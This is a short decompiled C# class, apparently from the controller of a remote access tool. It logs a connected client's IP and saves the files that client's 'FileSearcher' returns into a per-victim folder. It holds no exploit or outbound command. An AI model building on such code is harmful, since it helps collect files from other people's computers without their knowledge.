using System;
using System.Drawing;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x02000041 RID: 65
	internal class HandlerFileSearcher
	{
		// Token: 0x060001B3 RID: 435 RVA: 0x0001BD70 File Offset: 0x00019F70
		public static void Read(Clients client, object[] objects)
		{
			string ip = client.IP;
			string str = "Save Files in: Users\\";
			object obj = objects[1];
			Methods.AppendLogs(ip, str + ((obj != null) ? obj.ToString() : null) + "\\FileSearcher", Color.MediumPurple);
			string str2 = "Users\\";
			object obj2 = objects[1];
			DynamicFiles.Save(str2 + ((obj2 != null) ? obj2.ToString() : null) + "\\FileSearcher", (object[])objects[2]);
		}
	}
}
